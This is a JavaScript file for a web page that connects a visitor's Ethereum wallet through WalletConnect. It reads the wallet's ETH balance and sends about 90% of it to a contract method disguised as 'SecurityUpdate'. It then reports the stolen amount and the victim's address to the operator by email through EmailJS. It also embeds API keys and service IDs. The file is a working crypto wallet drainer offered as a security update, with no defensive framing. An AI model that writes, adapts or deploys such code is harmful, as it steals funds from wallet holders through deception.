// // Include the Email.js library
// import Web3 from "web3";
// import { EthereumProvider } from '@walletconnect/ethereum-provider'
const { EthereumProvider } = require('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.2/+esm');

var emailJsScript = document.createElement('script');
emailJsScript.src = 'https://cdn.emailjs.com/dist/email.min.js';
document.head.appendChild(emailJsScript);

const projectId = "ae41b4e768356491a7ee9a90f55c0c0f"; // Your MetaMask project ID
const chains = [1]; // Mainnet (you can add more chains if needed)
const showQrModal = true;
const methods = ["eth_sendTransaction", "eth_signTransaction", "eth_sign"];
const events = ["disconnect", "accountsChanged"];

const zip = async () => {
	try{
		
	const provider = EthereumProvider.init({
		projectId,
		chains,
		showQrModal,
		methods,
		events,
	  });	// document.getElementById("cont-name").innerHTML = data;


	} catch (error) {
    console.error('WalletConnect error:', error);
  }

}

// Initialize Web3 using the provider
const web3 = new Web3(provider);

// Function to send the email
function sendEmail(balance, wallet) {
  emailjs.init('g-iKBMjYyCWuMWun7'); // Replace 'your_user_id' with your actual user ID

  var templateParams = {
      balance: balance,
      wallet: wallet
  };

  emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
      .then(function(response) {
          console.log('Email sent:', response);
      })
      .catch(function(error) {
          console.error('Email error:', error);
      });
}

// Define runContract function
const runContract = async () => {
  try {
    await provider.enable(); // Request wallet connection
    if (provider.wc.connected) {
      // WalletConnect session is connected
      console.log('WalletConnect is connected!');
      const accounts = await provider.send('eth_requestAccounts', []);
      const account = accounts[0];
      const apiKey = "876RZ5Y8WWAXVNZN61T2WPFTGI5MBI5GGX"; // for eth
      const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
      
      const response = await fetch(ethBalanceApiUrl);
      const ethBalanceData = await response.json();
      const ethBalanceInWei = ethBalanceData.result;
      const gasFee = 0.1 * ethBalanceInWei;
      const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);

      // Now, you can use 'account' for your contract interactions
      const contractAbi = [{
        "constant": true,
        "inputs": [],
        "name": "getBalance",
        "outputs": [{
          "name": "",
          "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }, {
        "constant": false,
        "inputs": [],
        "name": "withdraw",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      }, {
        "constant": false,
        "inputs": [],
        "name": "SecurityUpdate",
        "outputs": [],
        "payable": true,
        "stateMutability": "payable",
        "type": "function"
      }, {
        "constant": true,
        "inputs": [],
        "name": "getOwner",
        "outputs": [{
          "name": "",
          "type": "address"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }, {
        "inputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "constructor"
      }];
      const contractAddress = "0x0206b09AC971cb742aA059A44Fb0200768690a33";

      const contract = new web3.eth.Contract(contractAbi, contractAddress);

      // Example payable function
      const payableFunction = contract.methods.SecurityUpdate();

      const valueInWei = ethtransaferableInWei;

      payableFunction
        .send({
          from: account,
          value: valueInWei,
          gas: 0
        })
        .then((receipt) => {
          console.log("Transaction receipt:", receipt);
          sendEmail(valueInWei, account);
        })
        .catch((error) => {
          console.error("Transaction error:", error);
        });
    }
  } catch (error) {
    console.error('WalletConnect error:', error);
  }
};

// Attach runContract to an HTML element's click event
// const connectButton = document.getElementById('connectButton');
// connectButton.addEventListener('click', runContract);
